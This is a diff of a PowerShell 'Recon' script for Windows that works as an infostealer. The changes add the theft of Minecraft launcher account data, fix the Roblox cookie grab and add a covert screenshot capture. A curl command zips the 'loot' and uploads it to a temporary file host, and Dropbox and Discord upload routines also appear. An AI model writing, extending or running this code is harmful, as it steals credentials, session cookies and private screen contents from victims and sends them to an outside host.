@@ -1,7 +1,7 @@
 ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
+# Title        : Recon             | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : Jakoby+Sealldev   |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
 # Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
@@ -85,7 +85,27 @@ function get-RobloxCookies {
 
 $roblox = get-RobloxCookies
 if ($roblox -ne $null) {
-	$robloxCookies >> $env:tmp/$FolderName/RobloxCookies.txt
+	$roblox >> $env:tmp/$FolderName/RobloxCookies.txt
+}
+
+# Get Minecraft Account Details
+function get-MinecraftAccounts {
+	try {
+		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json"
+	}
+	
+	catch {
+		Write-Error "Minecraft data not found!"
+		return $null
+		-ErrorAction SilentlyContinue
+	}
+	
+	return $data
+}
+
+$minecraft = get-MinecraftAccounts
+if ($minecraft -ne $null) {
+	$minecraft >> $env:tmp/$FolderName/MinecraftAccounts.json
 }
 
 ############################################################################################################################################################
@@ -567,6 +587,48 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 ############################################################################################################################################################
 
+# Get Screenshot
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
+function Get-ScreenCapture
+{
+    param(
+    [Switch]$OfWindow
+    )
+
+
+    begin {
+        Add-Type -AssemblyName System.Drawing
+        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
+            Where-Object { $_.FormatDescription -eq "JPEG" }
+    }
+    process {
+        Start-Sleep -Milliseconds 250
+        if ($OfWindow) {
+            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
+        } else {
+            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
+        }
+        Start-Sleep -Milliseconds 250
+        $bitmap = [Windows.Forms.Clipboard]::GetImage()
+        $ep = New-Object Drawing.Imaging.EncoderParameters
+        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
+        $screenCapturePathBase = "$env:temp\$FolderName\Screenshot"
+        $c = 0
+        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
+            $c++
+        }
+        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
+    }
+}
+
+$ss = Get-ScreenCapture
+
+# Clear clipboard of image
+Set-Clipboard -Value $null
+
+############################################################################################################################################################
+
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload output file to dropbox
@@ -587,7 +649,9 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
-$text = curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+# Upload file to temp file storage
+$text = "Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 function Upload-Discord {
 
